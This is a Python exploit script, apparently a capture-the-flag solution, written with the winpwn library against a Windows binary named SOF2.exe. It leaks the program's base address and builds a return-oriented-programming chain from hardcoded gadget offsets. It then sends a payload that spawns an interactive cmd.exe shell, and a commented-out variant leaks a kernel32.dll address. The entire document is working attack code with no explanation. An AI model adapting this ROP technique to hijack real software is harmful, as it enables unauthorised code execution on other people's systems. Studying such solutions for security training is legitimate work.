from winpwn import * 

p = process("SOF2.exe")  
context.windbg = "windbg.exe" 

p.recvuntil("SECRET: ") 
pie_base = eval(p.recv(10)) - 0x1050 
printf_extern = pie_base + 0x2098 

"""
gadget1 : 
mov     eax, [esi] 
test    eax, eax
jz      short loc_401690
call    eax
"""
gadget1 = pie_base + 0x1688                 

"""
gadget2 : 
pop     edi
pop     esi
retn
"""
gadget2 = pie_base + 0x1697 

gadget3 = pie_base + 0x10b7             #  adc eax, 0x402090 ; add esp, 4 ; push eax ; call esi
gadget4 = pie_base + 0x15b2             #  pop eax ; pop esi ; ret 
"""
0x00401057 : push esi ; push 0 ; push 4 ; push 0 ; call ebx <-- gadget 5  : push esi which hold printf_got into stack then pop to something 
"""
windbg.attach(p, "bp " + hex(gadget1) )
# payload = "a" * 0x10 + p32(gadget2+2) * 12 +  p32(gadget4) + p32(8) + p32(gadget2) + p32(gadget3) + p32(0)  + p32(gadget1) + p32(pie_base + 0x2110)       # leak kernel32.dll address 

write_addr = pie_base + 0x3064 
payload = "a" * 0x10 + p32(gadget4) + p32(0x14) + p32(gadget2) + p32(gadget3) + p32(0) + p32(gadget1) + p32(pie_base + 0x2134) + p32(write_addr) + p32(0x760bdab0) + p32(0) + p32(write_addr) + p32(0x09) #+ p32(pie_base + 0x1000)
p.sendline(payload) 
p.sendline("C:\WINDOWS\system32\cmd.exe")
p.interactive()